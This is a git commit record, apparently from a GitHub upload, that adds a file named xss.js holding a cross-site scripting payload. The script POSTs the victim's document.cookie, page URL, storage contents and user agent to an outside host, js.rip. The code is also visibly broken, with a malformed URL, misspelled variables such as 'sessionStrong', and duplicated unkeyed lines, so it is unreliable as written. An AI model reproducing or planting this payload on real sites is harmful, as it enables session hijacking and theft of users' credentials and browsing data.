657fc92302f83e2e3990c8375bd224eaa82ae199
abdrezzak12 <108536401+abdrezzak12@users.noreply.github.com>
2025-06-26 10:11:58 -0500

    Add files via upload

---
+++ xss.js
@@ -0,0 +1,15 @@
+fetch(https://"https://js.rip/1v7sr0xo3h", { 
+
+      method: "POST",
+      mode: "no-cache",
+      body: JSON.stringify({
+            cookie: document.cookie,
+            location: window.location.href,
+            localStorge:
+            JSON.stringify(sessionStrong),
+            JSON.stringify(sessionstrong),
+            userAgent: navigator.userAgent
+
+})
+
+});
